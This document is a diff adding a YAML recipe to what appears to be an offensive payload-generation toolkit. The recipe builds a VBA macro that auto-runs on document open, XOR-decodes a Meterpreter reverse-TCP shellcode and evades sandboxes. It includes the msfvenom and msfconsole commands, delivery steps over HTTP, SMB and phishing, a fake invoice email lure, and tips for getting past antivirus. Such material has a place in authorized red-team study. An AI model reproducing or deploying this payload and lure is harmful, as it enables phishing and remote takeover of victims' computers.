@@ -1,0 +1,206 @@
+meta:
+  name: "VBA Simple XOR Shellcode Runner"
+  category: "Shellcode Execution"
+  description: |
+    Simple shellcode runner in VBA macro with XOR encryption and sandbox evasion.
+    
+    Features:
+    - XOR encryption for basic obfuscation (key: 0xfa/250)
+    - FlsAlloc-based sandbox detection
+    - Sleep-based time check (10 second delay)
+    - Auto-execution via Document_Open and AutoOpen hooks
+    - Direct shellcode execution via VirtualAlloc + CreateThread
+    
+    This macro is designed for Microsoft Office documents (Word, Excel).
+    Includes multiple sandbox evasion techniques to bypass automated analysis.
+    
+    WARNING: For authorized security testing only!
+
+  effectiveness: medium
+
+  mitre:
+    tactic: "TA0002 - Execution"
+    technique: "T1204.002 - User Execution: Malicious File"
+
+  artifacts:
+    - "Office document with macros enabled"
+    - "FlsAlloc API calls"
+    - "10-second sleep before execution"
+    - "VirtualAlloc with PAGE_EXECUTE_READWRITE"
+    - "CreateThread API calls"
+    - "XOR-decoded shellcode in memory"
+    - "Network connection to C2 server"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker/C2 server IP address for reverse connection"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port on attacker machine"
+    required: true
+    default: 443
+
+  - name: "xor_key"
+    type: "hex"
+    description: "XOR encryption key (single byte, e.g., 'fa')"
+    required: false
+    default: fa
+
+  - name: "output_file"
+    type: "string"
+    description: "Output VBA macro filename"
+    required: false
+    default: "macro.vba"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing:
+  # Step 1: Generate raw shellcode using msfvenom
+  - type: "command"
+    name: "generate_shellcode"
+    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
+    output_var: "raw_shellcode"
+
+  # Step 2: XOR encrypt the shellcode
+  - type: "script"
+    name: "xor_encryption"
+    script: "xor_encrypt.py"
+    args:
+      data: "{{ raw_shellcode }}"
+      key: "{{ xor_key }}"
+    output_var: "xor_result"
+
+  # Step 3: Format encrypted shellcode as VBA byte array
+  - type: "script"
+    name: "format_payload"
+    script: "format_vba.py"
+    args:
+      data: "{{ xor_result.encrypted }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "vba_payload"
+
+  # Step 4: Convert hex key to decimal for VBA
+  - type: "script"
+    name: "hex_to_decimal"
+    script: "base64_encode.py"
+    args:
+      data: "{{ xor_key }}"
+    output_var: "xor_key_decimal_temp"
+
+output:
+  type: "template"
+  template: "shellcode_runner/simple_runner.vba"
+  compile:
+    enabled: false
+  launch_instructions: |
+    VBA Simple XOR Shellcode Runner - Launch Instructions
+
+    Step 1: Start Metasploit Listener
+
+    Start msfconsole and configure the handler:
+
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
+    Or manually in msfconsole:
+
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST {{ lhost }}
+    set LPORT {{ lport }}
+    set ExitOnSession false
+    exploit -j
+
+    Step 2: Create Office Document with Macro
+
+    Create a new Word or Excel document and add the macro:
+
+    In Microsoft Word:
+    1. Create new document
+    2. Press Alt+F11 to open VBA editor
+    3. Insert > Module
+    4. Copy and paste the contents of {{ output_file }}
+    5. Save as .docm (Word Macro-Enabled Document) or .doc (Word 97-2003)
+
+    In Microsoft Excel:
+    1. Create new workbook
+    2. Press Alt+F11 to open VBA editor
+    3. Insert > Module
+    4. Copy and paste the contents of {{ output_file }}
+    5. Save as .xlsm (Excel Macro-Enabled Workbook) or .xls (Excel 97-2003)
+
+    Step 3: Transfer Document to Target
+
+    Transfer the macro-enabled document to the target:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    Using email (phishing scenario):
+    Attach the document to an email with appropriate social engineering
+
+    Using SMB share:
+    impacket-smbserver share . -smb2support
+
+    Step 4: Execute on Target
+
+    The macro will automatically execute when:
+    - Document is opened (if macros are enabled)
+    - User clicks "Enable Content" button
+
+    Note: The macro waits 10 seconds before execution (sandbox evasion)
+
+    Step 5: Verify Connection
+
+    Check your Metasploit console for incoming session:
+    Sending stage (200262 bytes) to [target_ip]
+    Meterpreter session 1 opened
+
+    Notes:
+
+    - Encrypted with XOR key 0x{{ xor_key }} (decimal {{ xor_key_decimal }})
+    - Includes FlsAlloc-based sandbox detection
+    - Includes 10-second sleep for time-based evasion
+    - Auto-executes on document open via Document_Open and AutoOpen
+    - Uses VirtualAlloc with RWX permissions
+    - Executes shellcode in separate thread
+    - EXITFUNC=thread ensures clean exit
+
+    Macro Security Considerations:
+
+    - Target must have macros enabled or be willing to enable them
+    - Recent Office versions show security warnings
+    - Consider using trusted locations or signed macros for testing
+    - Windows Defender may flag VBA macros with suspicious API calls
+
+    Troubleshooting:
+
+    - If no connection: Check firewall rules on attacker machine
+    - If macro doesn't run: Verify macros are enabled (File > Options > Trust Center)
+    - If AV blocks: Consider additional obfuscation of API calls and strings
+    - Macro waits 10 seconds before execution (sandbox evasion feature)
+    - Requires x64 Windows system for x64 payload
+
+    Alternative Delivery:
+
+    Embedded in email with social engineering:
+    Subject: "Invoice #12345 - Payment Required"
+    Body: "Please review the attached invoice and remit payment within 7 days."
+
+    Cleanup:
+
+    After testing, delete the document:
+    Remove-Item document.docm -Force
+
+    Security Note:
+
+    This technique requires user interaction (opening document and enabling macros).
+    Modern Office versions have macro protection enabled by default.
+    Always obtain proper authorization before using in assessments.
